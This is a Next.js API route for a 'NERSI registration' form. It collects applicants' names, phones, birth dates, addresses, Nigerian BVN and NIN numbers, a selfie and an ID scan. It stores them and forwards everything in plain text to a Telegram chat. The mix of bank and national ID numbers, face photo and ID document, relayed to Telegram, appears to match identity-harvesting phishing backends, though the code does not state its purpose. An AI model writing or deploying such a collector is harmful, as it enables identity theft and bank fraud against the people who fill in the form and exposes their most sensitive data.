import { db, makeRef } from '@/lib/db';
import { validate, normalisePhone, type Fields } from '@/lib/validate';
import { esc, sendText, sendFile } from '@/lib/telegram';

export const runtime = 'nodejs';
export const maxDuration = 60;

const MAX_PHOTO = 5 * 1024 * 1024;
const MAX_ID = 8 * 1024 * 1024;

export async function POST(req: Request) {
  try {
    const form = await req.formData();

    if (String(form.get('website') ?? '').trim()) {
      return Response.json({ ok: false, error: 'Bot detected.' }, { status: 400 });
    }

    const fields: Fields = {
      fullName: String(form.get('fullName') ?? '').trim(),
      phone: String(form.get('phone') ?? '').trim(),
      dob: String(form.get('dob') ?? '').trim(),
      email: String(form.get('email') ?? '').trim(),
      address: String(form.get('address') ?? '').trim(),
      bvn: String(form.get('bvn') ?? '').trim(),
      nin: String(form.get('nin') ?? '').trim(),
      idType: String(form.get('idType') ?? '').trim(),
    };

    const errors = validate(fields);
    if (Object.keys(errors).length) {
      return Response.json({ ok: false, errors }, { status: 422 });
    }

    const photo = form.get('photo');
    const idFile = form.get('idFile');
    const hasPhoto = photo instanceof File && photo.size > 0;
    const hasId = idFile instanceof File && idFile.size > 0;

    if (!hasPhoto) return Response.json({ ok: false, errors: { photo: 'A recent photograph is required.' } }, { status: 422 });
    if ((photo as File).size > MAX_PHOTO) return Response.json({ ok: false, errors: { photo: 'Photograph must be under 5MB.' } }, { status: 422 });
    if (hasId && (idFile as File).size > MAX_ID) return Response.json({ ok: false, errors: { idFile: 'ID file must be under 8MB.' } }, { status: 422 });

    const phone = normalisePhone(fields.phone)!;
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0].trim() ?? 'unknown';

    const pool = await db();

    const { rows: recent } = await pool.query(
      `SELECT count(*)::int AS n FROM applications WHERE ip = $1 AND created_at > now() - interval '1 hour'`,
      [ip]
    );
    if (recent[0].n >= 8) {
      return Response.json({ ok: false, error: 'Too many submissions from this connection. Try again in an hour.' }, { status: 429 });
    }

    const ref = makeRef();
    const { rows } = await pool.query(
      `INSERT INTO applications
        (ref, full_name, phone, dob, email, address, bvn, nin, id_type, ip, user_agent)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)
       RETURNING id`,
      [ref, fields.fullName, phone, fields.dob, fields.email, fields.address,
       fields.bvn.replace(/\D/g, ''), fields.nin.replace(/\D/g, ''), fields.idType || null,
       ip, req.headers.get('user-agent') ?? null]
    );

    const html = [
      '<b>NEW NERSI REGISTRATION</b>',
      `<b>Ref:</b> <code>${ref}</code>`,
      '',
      '<b>PERSONAL</b>',
      `<b>Name:</b> ${esc(fields.fullName)}`,
      `<b>Phone:</b> ${esc(phone)}`,
      `<b>DOB:</b> ${esc(fields.dob)}`,
      `<b>Email:</b> ${esc(fields.email)}`,
      `<b>Address:</b> ${esc(fields.address)}`,
      '',
      '<b>IDENTITY</b>',
      `<b>BVN:</b> <code>${esc(fields.bvn)}</code>`,
      `<b>NIN:</b> <code>${esc(fields.nin)}</code>`,
      `<b>ID type:</b> ${esc(fields.idType || 'none supplied')}`,
      '',
      `<i>${new Date().toLocaleString('en-NG', { timeZone: 'Africa/Lagos' })} · ${esc(ip)}</i>`,
    ].join('\n');

    let notified = false;
    try {
      await sendText(html);
      await sendFile('photo', photo as File, `${ref} — selfie / photograph`);
      if (hasId) await sendFile('document', idFile as File, `${ref} — ${fields.idType || 'ID document'}`);
      notified = true;
      await pool.query(`UPDATE applications SET notified = true WHERE id = $1`, [rows[0].id]);
    } catch (err) {
      console.error('telegram delivery failed', err);
    }

    return Response.json({ ok: true, ref, notified });
  } catch (err) {
    console.error(err);
    return Response.json({ ok: false, error: 'Server error. Please try again.' }, { status: 500 });
  }
}
